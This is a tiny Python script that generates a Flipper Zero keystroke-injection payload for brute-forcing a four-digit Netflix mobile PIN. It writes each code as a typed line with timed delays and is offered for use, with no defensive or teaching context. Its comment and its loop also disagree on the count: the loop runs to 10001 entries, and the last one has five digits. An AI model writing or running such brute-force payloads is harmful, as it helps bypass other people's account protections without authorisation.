#Made By Jerzomimi.


#This script will create a file and then write the 9999 different combinations in the flipper zero language.
with open("bruteforce_pin for netflix mobile.txt", "w") as f:
    f.write("DELAY 1000\n")
    for i in range(10001):
        pin = f"{i:04}"
        f.write(f"STRING {pin}\n")
        f.write("DELAY 500\n")
